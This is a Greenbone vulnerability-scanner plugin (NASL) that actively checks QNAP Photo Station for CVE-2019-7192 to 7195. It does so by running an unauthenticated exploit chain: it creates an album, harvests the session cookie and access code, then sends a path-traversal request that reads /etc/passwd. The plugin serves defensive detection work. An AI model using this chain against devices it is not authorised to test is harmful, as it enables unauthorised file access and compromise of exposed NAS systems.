# Copyright (C) 2020 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:qnap:photo_station";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.144018");
  script_version("2020-06-02T09:51:24+0000");
  script_tag(name:"last_modification", value:"2020-06-03 10:15:20 +0000 (Wed, 03 Jun 2020)");
  script_tag(name:"creation_date", value:"2020-06-02 07:39:40 +0000 (Tue, 02 Jun 2020)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2019-7192", "CVE-2019-7193", "CVE-2019-7194", "CVE-2019-7195");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("QNAP Photo Station Multiple Vulnerabilities (NAS-201911-25) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_qnap_nas_photo_station_detect.nasl");
  script_mandatory_keys("QNAP/QTS/PhotoStation/detected");

  script_tag(name:"summary", value:"QNAP Photo Station is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple HTTP requests and checks the responses.");

  script_tag(name:"insight", value:"QNAP Photo Station is prone to multiple vulnerabilities:

  - Improper access control vulnerability allows remote attackers to gain unauthorized access to the system (CVE-2019-7192)

  - Improper input validation vulnerability allows remote attackers to inject arbitrary code to the system (CVE-2019-7193)

  - External control of file name or path vulnerability allows remote attackers to access or modify system files
    (CVE-2019-7194, CVE-2019-7195)");

  script_tag(name:"affected", value:"QNAP Photo Station versions prior to 5.2.11, 5.4.9, 5.7.10 and 6.0.3.");

  script_tag(name:"solution", value:"Update to version 5.2.11, 5.4.9, 5.7.10, 6.0.3 or later.");

  script_xref(name:"URL", value:"https://www.qnap.com/en/security-advisory/nas-201911-25");
  script_xref(name:"URL", value:"https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/48531");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/p/api/album.php";

headers = make_array("Content-Type", "application/x-www-form-urlencoded");

data = "a=setSlideshow&f=qsamplealbum";

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^HTTP/1\.[01] 200" || "<output>" >!< res)
  exit(99);

# <QDocRoot version="1.0"><status>0</status><output>cJinsP</output><timestamp>2020-06-02 14:10:47</timestamp></QDocRoot>
album_id = eregmatch(pattern: "<output>([^<]+)", string: res);
if (isnull(album_id[1]))
  exit(0);
else
  album_id = album_id[1];


if (isnull(cookie = http_get_cookie_from_header(buf: res, pattern: "(QMS_SID=[^;]+)")))
  exit(0);

url = dir + "/slideshow.php?album=" + album_id;
headers = make_array("Content-Type", "application/x-www-form-urlencoded",
                     "Cookie", cookie);

req = http_get_req(port: port, url: url, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "^HTTP/1\.[01] 200" || "encodeURIComponent" >!< res)
  exit(0);

# code: encodeURIComponent('NjU1MzR8MXwxNTkxMDg1NzM2'),
access_code = eregmatch(pattern: "encodeURIComponent\('([^']+)", string: res);
if (isnull(access_code))
  exit(0);
else
  access_code = access_code[1];

url = dir + "/p/api/video.php";
file = "/etc/passwd";

data = "album=" + album_id + "&a=caption&ac=" + access_code + "&filename=" + crap(data: "../", length: 3*9) +
       file;

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (egrep(string: res, pattern: "admin:.*:0:[01]:")) {
  report = 'It was possible to obtain the "' + file + '" file.\n\nResult:\n\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
